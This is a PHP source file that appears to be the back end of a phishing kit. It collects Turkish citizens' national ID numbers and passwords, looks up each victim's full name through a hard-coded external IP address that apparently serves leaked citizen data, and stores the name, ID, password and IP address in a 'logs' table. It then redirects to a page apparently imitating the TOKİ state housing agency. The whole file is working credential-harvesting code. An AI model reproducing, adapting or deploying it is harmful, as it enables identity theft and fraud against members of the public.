<?php
session_start();

require_once 'inc/brain.php';

$ipAdres = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

$tckn = $_POST['tckn'] ?? null;
$sifre = $_POST['pass'] ?? null;

if (empty($tckn) || empty($sifre)) {
    header('Location: giris.php?error=missing_data');
    exit;
}

if (!preg_match('/^\d{11}$/', $tckn)) {
    header('Location: giris.php?error=invalid_tckn');
    exit;
}

if (!isset($pdo) || !$pdo) {
    error_log('go.php: $pdo tanımlı değil veya bağlantı başarısız. inc/brain.php içerik kontrol edilsin.');
    header('Location: giris.php?error=db_no_connection');
    exit;
}

$apiUrl = 'http://193.187.132.206/api.php?tc=' . urlencode($tckn);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MyApp/1.0)');

$apiResponse = curl_exec($ch);
$curlErrNo = curl_errno($ch);
$curlErr = curl_error($ch);
curl_close($ch);

if ($curlErrNo !== 0 || !$apiResponse) {
    error_log("go.php: API cURL hatası ({$curlErrNo}): {$curlErr}");
    header('Location: giris.php?error=api_timeout');
    exit;
}

$decoded = json_decode($apiResponse, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    error_log('go.php: API JSON çözümlenemedi: ' . json_last_error_msg());
    header('Location: giris.php?error=api_invalid_json');
    exit;
}

// Orijinal hata kontrolü (API'nin {"error": "..."} gibi bir şey dönme ihtimaline karşı)
if (isset($decoded['error'])) {
    error_log('go.php: API "error" döndü: ' . $apiResponse);
    header('Location: giris.php?error=api_failed');
    exit;
}

// -------- YENİ API FORMATI İÇİN DEĞİŞİKLİK BAŞLANGICI --------

// 1. Cevabın bir dizi (array) ve ilk elemanın (index 0) var olduğunu kontrol et.
//    (Kullanıcı bulunamazsa API '[]' (boş dizi) dönebilir)
if (!is_array($decoded) || !isset($decoded[0])) {
    error_log("go.php: API cevap formatı beklenmedik (dizi veya [0] eksik): " . $apiResponse);
    header('Location: giris.php?error=api_user_not_found'); // TCKN bulunamadı olarak yönlendir
    exit;
}

// 2. Veriyi dizinin ilk elemanından ($decoded[0]) ve yeni anahtarlarla ('ADI', 'SOYADI') al.
$userData = $decoded[0];
$ad = $userData['ADI'] ?? null;
$soyad = $userData['SOYADI'] ?? null;

// -------- YENİ API FORMATI İÇİN DEĞİŞİKLİK BİTİŞİ --------


if (empty($ad) || empty($soyad)) {
    error_log("go.php: API cevap eksik (ADI veya SOYADI bulunamadı): " . $apiResponse);
    header('Location: giris.php?error=api_missing_name');
    exit;
}

$adSoyad = trim($ad) . ' ' . trim($soyad);
$ilkIsim = trim($ad);
$sql = "INSERT INTO logs (
    log_time, 
    adsoyad, 
    adsoyad_tr1,
    kart_numarasi, 
    tckns,
    ip_address
) VALUES (
    NOW(), 
    :adsoyad, 
    :adsoyad_tr1,
    :sifre, 
    :tckns,
    :ip
)";

try {
    $stmt = $pdo->prepare($sql);

    $stmt->bindParam(':adsoyad', $adSoyad);
    $stmt->bindParam(':adsoyad_tr1', $ilkIsim); 
    $stmt->bindParam(':sifre', $sifre);
    $stmt->bindParam(':tckns', $tckn);
    $stmt->bindParam(':ip', $ipAdres);
    $stmt->execute();

    $_SESSION['tckn'] = $tckn;
    header('Location: toki.php');
    exit;

} catch (PDOException $e) {
    error_log("Veritabanı hatası: " . $e->getMessage());
    header('Location: giris.php?error=dberror');
    exit;
}
?>